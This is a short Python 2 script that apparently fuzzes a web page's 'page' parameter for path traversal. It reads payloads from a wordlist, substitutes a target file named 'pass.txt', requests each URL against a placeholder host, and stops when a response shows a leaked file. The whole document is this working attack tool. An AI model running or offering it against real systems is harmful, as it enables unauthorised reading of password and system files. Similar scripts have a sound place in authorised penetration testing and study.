#!/usr/bin/env python

import urllib
import re

url = 'http://test/?page='
file = 'pass.txt'

f = open('path-traversal.txt')
lines = f.read().splitlines()
f.close()

for line in lines:
	if bool(re.search("^#", line)) is False:
		value = line.replace("{FILE}", file);
		full_url = url + value
		response = urllib.urlopen(full_url)

		if response.code == 200:
			print full_url + ' -> ' + str(response.code)
			html = response.read()

			if bool(re.search("<code>(.|\n)+</code>", html)):
				print 'File found!!'
				break
		else:
			print full_url + ' -> ' + str(response.code)

print "THE END!"
